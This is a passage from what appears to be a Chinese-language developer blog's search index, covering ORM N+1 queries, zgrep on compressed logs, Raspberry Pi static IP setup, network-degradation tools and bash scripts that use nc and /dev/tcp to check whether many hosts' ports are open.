Loading，Laravel 的 <code>with</code> 跟這個有關係</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/google4y/p/3455534.html\" target=\"_blank\" rel=\"noopener\">ORM 中的 N+1 问题 - google4y - 博客园</a></li>\n<li><a href=\"https://secure.phabricator.com/book/phabcontrib/article/n_plus_one/\" target=\"_blank\" rel=\"noopener\">◉ Performance: N+1 Query Problem</a></li>\n<li><a href=\"http://www.haohongfan.com/2018/11/graphql-n-1-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">GraphQL N+1 问题解决方案 | HHF 金字塔</a></li>\n<li><a href=\"https://medium.com/@dd0425/rails-n-1-queries-problem-73dfe5f99182\" target=\"_blank\" rel=\"noopener\">[Rails] N+1 Queries Problem – Dosmanthus – Medium</a></li>\n<li><a href=\"https://laravel.com/docs/5.8/eloquent-relationships#eager-loading\" target=\"_blank\" rel=\"noopener\">Eloquent: Relationships - Laravel - The PHP Framework For Web Artisans</a></li>\n<li><a href=\"https://my.oschina.net/oncereply/blog/268922\" target=\"_blank\" rel=\"noopener\">数据库:django ORM 如何处理 N+1 查询 - 答复哈 - OSCHINA</a></li>\n<li><a href=\"http://nsps5203.pixnet.net/blog/post/277235432-laravel-n%2B1-problem\" target=\"_blank\" rel=\"noopener\">Laravel N+1 Problem @ Neil的部落格 :: 痞客邦 ::</a></li>\n</ul>\n<h3 id=\"相關連結\"><a href=\"#相關連結\" class=\"headerlink\" title=\"相關連結\"></a>相關連結</h3><ul>\n<li><a href=\"http://vanry.me/laravel/secod-level-cache.html\" target=\"_blank\" rel=\"noopener\">Laravel 使用二级缓存提高缓存命中率和内存使用效率 - 探花的 Blog</a></li>\n<li><a href=\"https://learnku.com/laravel/t/1220/laravel-queries-only-individual-fields-in-with-queries\" target=\"_blank\" rel=\"noopener\">Laravel 在 with 查询中只查询个别字段 | Laravel China 社区 - 高品质的 Laravel 开发者社区</a></li>\n<li><a href=\"https://learnku.com/laravel/t/14691/extended-recommendation-n1-question-capture-artifact-for-laravel-query-detector-data-model-query\" target=\"_blank\" rel=\"noopener\">[擴展推薦] Laravel Query Detector 數據模型查詢的 N+1 問題捕殺神器 | Laravel China 社區 - 高品質的 Laravel 開發者社區</a></li>\n<li><a href=\"https://learnku.com/articles/8115/using-graphql-one-in-laravel-get-data\" target=\"_blank\" rel=\"noopener\">在 Laravel 中使用 GraphQL 一【获取数据】 | Laravel China 社区 - 高品质的 Laravel 开发者社区</a></li>\n<li><a href=\"https://jerryzou.com/posts/10-questions-about-graphql/\" target=\"_blank\" rel=\"noopener\">阻礙你使用 GraphQL 的十個問題 | 咀嚼之味</a></li>\n</ul>\n<h2 id=\"其他小記\"><a href=\"#其他小記\" class=\"headerlink\" title=\"其他小記\"></a>其他小記</h2><h3 id=\"GraphQL-小記\"><a href=\"#GraphQL-小記\" class=\"headerlink\" title=\"GraphQL 小記\"></a>GraphQL 小記</h3><ul>\n<li><a href=\"https://cnodejs.org/topic/5ac073b852d7d3a8698a49f4\" target=\"_blank\" rel=\"noopener\">TypeORM - 最好的 Node.js ORM 框架 - CNode 技术社区</a></li>\n<li><a href=\"https://haofly.net/graphql-tutorial-6/\" target=\"_blank\" rel=\"noopener\">GraphQL 教程（六）—— N+1 问题和缓存等问题 | 豪翔天下</a></li>\n<li><a href=\"https://codeburst.io/using-dataloader-with-graphql-a-concrete-example-9b21352f1676\" target=\"_blank\" rel=\"noopener\">Using DataLoader with GraphQL: A Concrete Example – codeburst</a></li>\n<li><a href=\"https://learnku.com/articles/8115/using-graphql-one-in-laravel-get-data\" target=\"_blank\" rel=\"noopener\">在 Laravel 中使用 GraphQL 一【获取数据】 | Laravel China 社区 - 高品质的 Laravel 开发者社区</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10207606\" target=\"_blank\" rel=\"noopener\">GraphQL Design: 使用 DataLoader 提升效能 ! - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://jerryzou.com/posts/10-questions-about-graphql/\" target=\"_blank\" rel=\"noopener\">阻碍你使用 GraphQL 的十个问题 | 咀嚼之味</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10200678\" target=\"_blank\" rel=\"noopener\">GraphQL 入門： 簡介 \bX 範例 X 優缺點 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a href=\"https://medium.com/@evenchange4/2018-graphql-%E6%BC%B8%E9%80%B2%E5%BC%8F%E5%B0%8E%E5%85%A5%E7%9A%84%E6%9E%B6%E6%A7%8B-aeb2603f2223\" target=\"_blank\" rel=\"noopener\">2018 GraphQL 漸進式導入的架構 – Michael Hsu – Medium</a></li>\n</ul>\n<h3 id=\"sharding-小記\"><a href=\"#sharding-小記\" class=\"headerlink\" title=\"sharding 小記\"></a>sharding 小記</h3><blockquote>\n<p>當下還沒有非常令人滿意的基於 hibernate 的 sharding 框架，（關於 hibernate hards 會在下文介紹），因此很多團隊會選擇自行實現 sharding。</p>\n</blockquote>\n<p>原文網址：<a href=\"https://read01.com/AJO2Bm.html\" target=\"_blank\" rel=\"noopener\">https://read01.com/AJO2Bm.html</a></p>\n<p><a href=\"https://openhome.cc/Gossip/SpringGossip/SpringDAO.html\" target=\"_blank\" rel=\"noopener\">Spring 的 DAO 支持</a></p>\n<h3 id=\"ftp-小記\"><a href=\"#ftp-小記\" class=\"headerlink\" title=\"ftp 小記\"></a>ftp 小記</h3><p>因為最近沒時間整理<br>所以先暫時貼在這<br>目前可能組<code>put xxx</code>的 ftp 指令內容<br>最後在<code>sftp &lt; xxx.txt</code>會比較快</p>\n<ul>\n<li><a href=\"https://gist.github.com/timendum/1109055\" target=\"_blank\" rel=\"noopener\">List all files in a ftp folder in a text file [ bash ls ]</a></li>\n<li><a href=\"https://stackoverflow.com/questions/1894347/how-to-upload-ftp-files-to-server-in-a-bash-script/1894479\" target=\"_blank\" rel=\"noopener\">How to upload (FTP) files to server in a bash script? - Stack Overflow</a></li>\n<li><a href=\"https://askubuntu.com/questions/576927/get-notified-about-new-files-on-sftp-server\" target=\"_blank\" rel=\"noopener\">bash - Get notified about new files on SFTP server - Ask Ubuntu</a></li>\n<li><a href=\"http://linux48.com/2014-11-11-shell-ftp-uplod.html\" target=\"_blank\" rel=\"noopener\">用二句 Shell 命令实现 FTP 批量上传文件夹 - linux48</a></li>\n<li><a href=\"https://stackoverflow.com/questions/44019171/upload-files-from-a-list-via-ftp-in-bash\" target=\"_blank\" rel=\"noopener\">Upload files from a list via ftp in bash - Stack Overflow</a></li>\n</ul>\n","categories":["程式心法"],"tags":["sql","orm"]},{"title":"查詢有壓縮(gz)日誌 log 方法","url":"/blog/2021/01/17/%E6%9F%A5%E8%A9%A2%E6%9C%89%E5%A3%93%E7%B8%AE-gz-%E6%97%A5%E8%AA%8C-log-%E6%96%B9%E6%B3%95/","content":"<p>常常要抓下來再解縮查詢<br>這樣常常花了滿多時間</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gunzip -c mygzfile.gz | grep <span class=\"string\">\"string to be searched\"</span></span><br><span class=\"line\"><span class=\"comment\"># 推薦使用這個，想看到哪一個檔案比較方便</span></span><br><span class=\"line\">zgrep <span class=\"string\">\"pattern\"</span> file.gz</span><br><span class=\"line\">zgrep <span class=\"string\">\"power\"</span> messages.*.gz</span><br></pre></td></tr></table></figure>\n<p>參考來源:<br><a href=\"https://stackoverflow.com/questions/24218032/how-to-search-for-a-particular-string-from-a-gz-file\" target=\"_blank\" rel=\"noopener\">linux - how to search for a particular string from a .gz file? - Stack Overflow</a></p>\n<p>不過還是建議大檔案不要用這種方式查詢<br>還不確定會不會造成什麼不良影響</p>\n<p>彩蛋<br>有空實作:<br><a href=\"https://askubuntu.com/questions/405663/configuring-logrotate-without-root-access-per-user-log-rotation\" target=\"_blank\" rel=\"noopener\">cron - Configuring logrotate without root access (per user log rotation) - Ask Ubuntu</a><br><a href=\"https://www.pianshen.com/article/491436071/\" target=\"_blank\" rel=\"noopener\">Docker安全自动化扫描工具对比测试 - 程序员大本营</a><br><a href=\"https://www.hi-linux.com/posts/44367.html\" target=\"_blank\" rel=\"noopener\">如何优雅的在 Docker 容器中指定用户及组权限的三种方式 - 奇妙的 Linux 世界</a></p>\n","categories":["Linux"],"tags":["log","gz"]},{"title":"樹梅派(Raspberry PI)設定固定 IP 方法","url":"/blog/2019/10/24/%E6%A8%B9%E6%A2%85%E6%B4%BE-Raspberry-PI-%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-IP-%E6%96%B9%E6%B3%95/","content":"<p>Raspberry PI 設定小記<br>因為最近中華 P883 偶爾連不到 Raspberry Pi<br>重開 P883 就能使用<br>不知道是不是在中華數據機設定就會很不穩<br>所以我想改成設定在 PI 上面</p>\n<a id=\"more\"></a>\n<h2 id=\"設在-Router-機器-vs-設定主機-好處\"><a href=\"#設在-Router-機器-vs-設定主機-好處\" class=\"headerlink\" title=\"設在 Router 機器 vs 設定主機 好處\"></a>設在 Router 機器 vs 設定主機 好處</h2><p>一般有這兩種，各有優缺點</p>\n<p>假如 Router 機器掛掉，裡面資料 IP 有備份可能不用重新設定<br>但需要買一樣的 數據機</p>\n<p>相反主機也是這個道理，目前我看我做網路朋友是選<code>設定主機</code></p>\n<h2 id=\"設定方法\"><a href=\"#設定方法\" class=\"headerlink\" title=\"設定方法\"></a>設定方法</h2><p>/etc/dhcpcd.conf<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">interface eth0</span><br><span class=\"line\">static ip_address=192.168.1.177</span><br><span class=\"line\">static routers=192.168.1.1</span><br><span class=\"line\">static domain_name_servers=192.168.1.1</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"以前方法\"><a href=\"#以前方法\" class=\"headerlink\" title=\"以前方法\"></a>以前方法</h2><p>還是紀錄一下</p>\n<p>######################<br>/etc/network/interfaces</p>\n<p>######################<br>iface eth0 inet static<br>address x.x.x.x<br>netmask x.x.x.x<br>network x.x.x.x<br>broadcast x.x.x.x<br>gateway x.x.x.x</p>\n<p>######################<br>/etc/resolv.conf</p>\n<p>######################<br>nameserver x.x.x.x</p>\n<p>參考來源:<br><a href=\"http://yehnan.blogspot.com/2016/05/raspberry-piipdhcpcd.html\" target=\"_blank\" rel=\"noopener\">葉難: Raspberry Pi：固定私有IP與dhcpcd</a><br><a href=\"http://yhhuang1966.blogspot.com/2019/02/ip.html\" target=\"_blank\" rel=\"noopener\">小狐狸事務所: 設定樹莓派區網固定 IP</a><br><a href=\"https://medium.com/@chungyi410/%E5%B0%87-raspberry-pi-%E7%9A%84-eth0-%E7%B6%B2%E8%B7%AF%E4%BB%8B%E9%9D%A2%E8%A8%AD%E5%AE%9A%E5%9B%BA%E5%AE%9A-ip-43010aa3effb\" target=\"_blank\" rel=\"noopener\">將樹莓派 (Raspberry Pi) 的 eth0 / wlan0 網路介面設定固定 IP - 黃忠義 - Medium</a></p>\n","categories":["Linux"],"tags":["pi","raspberry"]},{"title":"模擬不良網路環境方法","url":"/blog/2020/04/26/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/","content":"<p>之前有跟別的廠商藉接機器<br>但是後來覺得網路順斷，機器不會自動連線<br>一直在想有什麼可以模擬這種網路狀況<br>機器還可不可以運作<br>最近有爬到一些文章</p>\n<p><strong>最後嘗試，我這種情境還是沒辦法模擬出當時狀況</strong><br><strong>所以這篇就單純紀錄</strong><br>因為最近動物機載 BT ，偶爾會發生連不到動物機狀態<br>嚴重是完全連不到，輕微拔掉網路線就會正常一下，過一會就 ping 不到<br>我朋友估計是樹梅派問題，重開機就會正常…<br>log 也沒有看到哪裡出問題，不知道公司狀況也是不是這一種?<br>連線方法可以參考(下面內容):<a href=\"https://malagege.github.io/blog/2019/01/27/Linux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%EF%BC%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2/\">Linux在Wifi使用pppoe連線後，重開機不能連線上網 | 程式狂想筆記</a></p>\n<a id=\"more\"></a>\n<h2 id=\"tc\"><a href=\"#tc\" class=\"headerlink\" title=\"tc\"></a>tc</h2><p><a href=\"https://www.haxi.cc/archives/iptables-%E9%99%90%E9%80%9F.html\" target=\"_blank\" rel=\"noopener\">iptables 限速 - 哈希</a><br><a href=\"https://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html\" target=\"_blank\" rel=\"noopener\">Linux模拟复杂网络环境下的传输（netem和tc） - 哈希</a></p>\n<p><a href=\"https://yuanchieh.page/posts/2019-04-05_linux-traffic-control/\" target=\"_blank\" rel=\"noopener\">Linux Traffic Control (tc) 研究 // Yuanchieh’s Blog</a><a href=\"/blog/2020/04/26/模擬不良網路環境方法/web1.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"tc-查看-list\"><a href=\"#tc-查看-list\" class=\"headerlink\" title=\"tc 查看 list\"></a>tc 查看 list</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">tc qdisc show</span><br><span class=\"line\">tc class show dev eth0</span><br><span class=\"line\">tc filter show dev eth0</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://superuser.com/questions/251032/tc-iproute2-how-to-list-the-configuration\" target=\"_blank\" rel=\"noopener\">linux - tc / iproute2, how to list the configuration - Super User</a></p>\n<h2 id=\"comcast\"><a href=\"#comcast\" class=\"headerlink\" title=\"comcast\"></a>comcast</h2><p><a href=\"https://cizixs.com/2017/10/23/tc-netem-for-terrible-network/\" target=\"_blank\" rel=\"noopener\">使用 tc netem 模拟网络异常 | Cizixs Write Here</a><br><a href=\"https://github.com/tylertreat/comcast\" target=\"_blank\" rel=\"noopener\">tylertreat/comcast: Simulating shitty network connections so you can build better systems.</a></p>\n<h2 id=\"pyshaper\"><a href=\"#pyshaper\" class=\"headerlink\" title=\"pyshaper\"></a>pyshaper</h2><blockquote>\n<p>pyshaper是一個帶有gui的限速工具。</p>\n</blockquote>\n<h2 id=\"連結紀錄\"><a href=\"#連結紀錄\" class=\"headerlink\" title=\"連結紀錄\"></a>連結紀錄</h2><p>跟我想像的不太一樣，有空再補</p>\n<ul>\n<li><a href=\"https://www.haxi.cc/archives/iptables-%E9%99%90%E9%80%9F.html\" target=\"_blank\" rel=\"noopener\">iptables 限速 - 哈希</a></li>\n<li><a href=\"https://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html\" target=\"_blank\" rel=\"noopener\">Linux模拟复杂网络环境下的传输（netem和tc） - 哈希</a></li>\n<li><a href=\"https://cizixs.com/2017/10/23/tc-netem-for-terrible-network/\" target=\"_blank\" rel=\"noopener\">使用 tc netem 模拟网络异常 | Cizixs Write Here</a></li>\n<li><a href=\"https://github.com/tylertreat/comcast\" target=\"_blank\" rel=\"noopener\">tylertreat/comcast: Simulating shitty network connections so you can build better systems.</a></li>\n<li><a href=\"https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2017/08/10/linux-net-traffic-control.html#trickle\" target=\"_blank\" rel=\"noopener\">linux的traffic control@小鸟技术笔记</a></li>\n<li><a href=\"https://blog.csdn.net/baidu_zhongce/article/details/46874583\" target=\"_blank\" rel=\"noopener\">利用Dummynet模拟恶劣网络环境_运维_baidu_zhongce的博客-CSDN博客</a></li>\n<li><a href=\"https://www.cnblogs.com/jinjiangongzuoshi/p/5272787.html\" target=\"_blank\" rel=\"noopener\">模拟恶劣网络环境常用的几种解决方案 - 狂师 - 博客园</a></li>\n<li><a href=\"http://freenet.mcnabhosting.com/python/pyshaper/\" target=\"_blank\" rel=\"noopener\">pyshaper - your easy dynamic traffic-shaper</a></li>\n<li><a href=\"https://www.shangmayuan.com/a/0fd3247055c54298b214d92c.html\" target=\"_blank\" rel=\"noopener\">如何模拟弱网测试 - 尚码园</a></li>\n<li><a href=\"http://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html\" target=\"_blank\" rel=\"noopener\">Linux模拟复杂网络环境下的传输（netem和tc） - 哈希</a></li>\n<li><a href=\"https://blog.plotcup.com/2012/08/24/linux-xia-shi-yong-iptables-he-tc-xian-zhi-liu-liang-bi-ji/\" target=\"_blank\" rel=\"noopener\">linux下使用iptables和tc限制流量笔记 | Chronos</a></li>\n<li><a href=\"https://yuanchieh.page/posts/2019-04-05_linux-traffic-control/\" target=\"_blank\" rel=\"noopener\">Linux Traffic Control (tc) 研究 // Yuanchieh’s Blog</a></li>\n</ul>\n","categories":["Linux"],"tags":["linux","tc"]},{"title":"檢查大量不同 IP 跟 Port 方法","url":"/blog/2020/03/07/%E6%AA%A2%E6%9F%A5%E5%A4%A7%E9%87%8F%E4%B8%8D%E5%90%8C-IP-%E8%B7%9F-Port-%E6%96%B9%E6%B3%95/","content":"<p>最近要測試大量主機 Port ，看裡面東西有沒有開通<br>使用大量 <code>telnet ip port</code> 非常花很多時間<br>最近在想有沒有好用的工具方便我們檢查</p>\n<a id=\"more\"></a>\n<h2 id=\"建立多台-vagrant-連線\"><a href=\"#建立多台-vagrant-連線\" class=\"headerlink\" title=\"建立多台 vagrant 連線\"></a>建立多台 vagrant 連線</h2><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\">Vagrant.configure(<span class=\"string\">\"2\"</span>) <span class=\"keyword\">do</span> <span class=\"params\">|config|</span></span><br><span class=\"line\">  config.vm.provision <span class=\"string\">\"shell\"</span>, <span class=\"symbol\">inline:</span> <span class=\"string\">\"echo Hello\"</span></span><br><span class=\"line\">  config.vm.define <span class=\"string\">\"web\"</span> <span class=\"keyword\">do</span> <span class=\"params\">|web|</span></span><br><span class=\"line\">    web.vm.box = <span class=\"string\">\"ubuntu/xenial64\"</span></span><br><span class=\"line\">    web.vm.network <span class=\"string\">\"private_network\"</span>, <span class=\"symbol\">ip:</span> <span class=\"string\">\"192.168.50.2\"</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">  config.vm.define <span class=\"string\">\"db\"</span> <span class=\"keyword\">do</span> <span class=\"params\">|db|</span></span><br><span class=\"line\">    db.vm.box = <span class=\"string\">\"ubuntu/xenial64\"</span></span><br><span class=\"line\">    db.vm.network <span class=\"string\">\"private_network\"</span>, <span class=\"symbol\">ip:</span> <span class=\"string\">\"192.168.50.3\"</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"nc-檢查法\"><a href=\"#nc-檢查法\" class=\"headerlink\" title=\"nc 檢查法\"></a>nc 檢查法</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ timeout 2 bash -c &quot;&lt;/dev/tcp/canyouseeme.org/80&quot;; echo $?</span><br><span class=\"line\">0</span><br><span class=\"line\">$ timeout 2 bash -c &quot;&lt;/dev/tcp/canyouseeme.org/81&quot;; echo $?</span><br><span class=\"line\">124</span><br><span class=\"line\">$ timeout --preserve-status 2 bash -c &quot;&lt;/dev/tcp/canyouseeme.org/81&quot;; echo $?</span><br><span class=\"line\">143</span><br><span class=\"line\">$ nc -w 2 -v canyouseeme.org 80 &lt;/dev/null; echo $?</span><br><span class=\"line\">Connection to canyouseeme.org 80 port [tcp/http] succeeded!</span><br><span class=\"line\">0</span><br><span class=\"line\">$ nc -w 2 -v canyouseeme.org 81 &lt;/dev/null; echo $?</span><br><span class=\"line\">nc: connect to canyouseeme.org port 81 (tcp) timed out: Operation now in progress</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/4922943/test-if-remote-tcp-port-is-open-from-a-shell-script/14701003#14701003\" target=\"_blank\" rel=\"noopener\">Test if remote TCP port is open from a shell script - Stack Overflow</a></p>\n<p><a href=\"https://gist.github.com/gerjantd/9787606\" target=\"_blank\" rel=\"noopener\">Bash/nc: netcat as a simple port scanner</a><br><a href=\"https://github.com/Firxiao/check_service_ports\" target=\"_blank\" rel=\"noopener\">Firxiao/check_service_ports: A tool (based nc) check service’s tcp or udp is opened or closed</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> &#123;10.21.xxx.yyy,10.21.xxx.yyy,10.23.xxx.yyy&#125;;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> &#123;5501,5502,5503,5504,7701,7702,7703,7704,5551,5552,5553,7771,7772,7773&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">do</span></span><br><span class=\"line\">                (<span class=\"built_in\">echo</span> &gt; /dev/tcp/<span class=\"variable\">$&#123;i&#125;</span>/<span class=\"variable\">$&#123;j&#125;</span>) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;i&#125;</span>:<span class=\"variable\">$&#123;j&#125;</span> :: it's getting connected\"</span> || <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$&#123;i&#125;</span>:<span class=\"variable\">$&#123;j&#125;</span> :: it's not connecting\"</span></span><br><span class=\"line\">        <span class=\"keyword\">done</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/29392568/shell-script-telnet-multiple-hostsports\" target=\"_blank\" rel=\"noopener\">bash - Shell Script - telnet multiple hosts:ports - Stack Overflow</a><br>發現這個範例還滿適合我現在的需求<br>用這個 shell 小改，順便加個顏色<a href=\"https://blog.longwin.com.tw/2015/02/bash-shell-color-display-2015/\" target=\"_blank\" rel=\"noopener\">Bash Shell 顯示 顏色的語法 | Tsung’s Blog</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\">COLOR_REST=<span class=\"string\">'\\e[0m'</span>;</span><br><span class=\"line\">COLOR_GREEN=<span class=\"string\">'\\e[0;32m'</span>;</span><br><span class=\"line\">COLOR_RED=<span class=\"string\">'\\e[0;31m'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> tw.yahoo.com google.com.tw;</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> 80 233;</span><br><span class=\"line\">        <span class=\"keyword\">do</span></span><br><span class=\"line\">                (nc -zv -w 5 <span class=\"variable\">$&#123;i&#125;</span> <span class=\"variable\">$&#123;j&#125;</span>) &gt; /dev/null 2&gt;&amp;1 &amp;&amp; <span class=\"built_in\">echo</span> -e <span class=\"string\">\"<span class=\"variable\">$&#123;COLOR_GREEN&#125;</span><span class=\"variable\">$&#123;i&#125;</span>:<span class=\"variable\">$&#123;j&#125;</span> :: it's getting connected<span class=\"variable\">$&#123;COLOR_REST&#125;</span>\"</span> || <span class=\"built_in\">echo</span> -e <span class=\"string\">\"<span class=\"variable\">$&#123;COLOR_RED&#125;</span><span class=\"variable\">$&#123;i&#125;</span>:<span class=\"variable\">$&#123;j&#125;</span> :: it's not connecting<span class=\"variable\">$&#123;COLOR_REST&#125;</span>\"</span></span><br><span class=\"line\">        <span class=\"keyword\">done</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>顏色 echo 需要加 <code>-e</code><br>第一次看到 shell 可以用 <code>{}</code>包迴圈<br>不過只有單筆會有問題樣子<br>所以我這邊有簡單調整另外一種寫法</p>\n<p>例外還有多種運用<br><a href=\"https://zhuanlan.zhihu.com/p/79244844\" target=\"_blank\" rel=\"noopener\">第6期：使用nc批量做网络连通性测试 - 知乎</a><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># checking network connectivity</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># IPs and ports to check</span></span><br><span class=\"line\"><span class=\"comment\"># Ignore blank lines and treat hash sign as comments</span></span><br><span class=\"line\"><span class=\"comment\"># comments will be kept as a comment of result</span></span><br><span class=\"line\">IP_PORT=<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\"># local host </span></span><br><span class=\"line\"><span class=\"string\">127.0.0.1 22</span></span><br><span class=\"line\"><span class=\"string\">127.0.0.1 21</span></span><br><span class=\"line\"><span class=\"string\"># well known sites</span></span><br><span class=\"line\"><span class=\"string\">www.google.com 80</span></span><br><span class=\"line\"><span class=\"string\">www.baidu.com 80</span></span><br><span class=\"line\"><span class=\"string\">\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># checking</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$IP_PORT</span>\"</span> | grep -Ev <span class=\"string\">\"^$\"</span> |</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line;<span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"comment\"># simply print comment line</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$line</span>\"</span> | grep -qE <span class=\"string\">\"^#\"</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ $? -eq 0 ];<span class=\"keyword\">then</span></span><br><span class=\"line\">      <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$line</span>\"</span></span><br><span class=\"line\">      <span class=\"built_in\">continue</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># normal line with ip and port</span></span><br><span class=\"line\">  connectFlag=<span class=\"string\">\"DOWN\"</span></span><br><span class=\"line\">  nc -z -w 1 <span class=\"variable\">$line</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ $? -eq 0 ];<span class=\"keyword\">then</span></span><br><span class=\"line\">      connectFlag=<span class=\"string\">\"UP\"</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span> <span class=\"string\">\"%-20s %5s %5s\\n\"</span> <span class=\"variable\">$line</span> <span class=\"variable\">$connectFlag</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure></p>\n<p>以下方案失敗 QQ<br>先留著</p>\n<h2 id=\"使用-ansible-方法\"><a href=\"#使用-ansible-方法\" class=\"headerlink\" title=\"使用 ansible 方法\"></a>使用 ansible 方法</h2><p><a href=\"https://medium.com/@chanhiuyeung/ansible-playbook-for-network-port-checking-from-host-level-openshift-as-example-fb1960090fdf\" target=\"_blank\" rel=\"noopener\">Ansible Playbook for network port checking from host level — OpenShift as example</a></p>\n<p>有看到有人用 ansible 做出符合我的需求工具<br>這邊就順便驗證是否可以正常執行</p>\n<h3 id=\"ansible-安裝\"><a href=\"#ansible-安裝\" class=\"headerlink\" title=\"ansible 安裝\"></a>ansible 安裝</h3><p>window 不能安裝 ansible<br><a href=\"https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html\" target=\"_blank\" rel=\"noopener\">Installing Ansible — Ansible Documentation</a><br>更多系統可以參考上面連結</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install software-properties-common</span><br><span class=\"line\">sudo apt-add-repository --yes --update ppa:ansible/ansible</span><br><span class=\"line\">sudo apt install ansible</span><br></pre></td></tr></table></figure>\n<h3 id=\"ansible\"><a href=\"#ansible\" class=\"headerlink\" title=\"ansible\"></a>ansible</h3><p>FAILED =&gt; Using a SSH password instead of a key is not possible because Host Key checking is enabled and sshpass does not support this.  Please add this host’s fingerprint to your known_hosts file to manage this host.<br><a href=\"http://www.361way.com/ansible-cfg/4401.html\" target=\"_blank\" rel=\"noopener\">ansible小结（四）ansible.cfg与默认配置 - 运维之路</a></p>\n<p>host_key_checking = False  </p>\n<h2 id=\"其他類似程式\"><a href=\"#其他類似程式\" class=\"headerlink\" title=\"其他類似程式\"></a>其他類似程式</h2><p><a href=\"http://www.weithenn.org/2011/11/check-host.html\" target=\"_blank\" rel=\"noopener\">Check Host - 小巧實用網路監控軟體 ~ 不自量力 の Weithenn</a></p>\n<p><a href=\"https://medium.com/@chanhiuyeung/ansible-playbook-for-network-port-checking-from-host-level-openshift-as-example-fb1960090fdf\" target=\"_blank\" rel=\"noopener\">Ansible Playbook for network port checking from host level — OpenShift as example</a><br><a 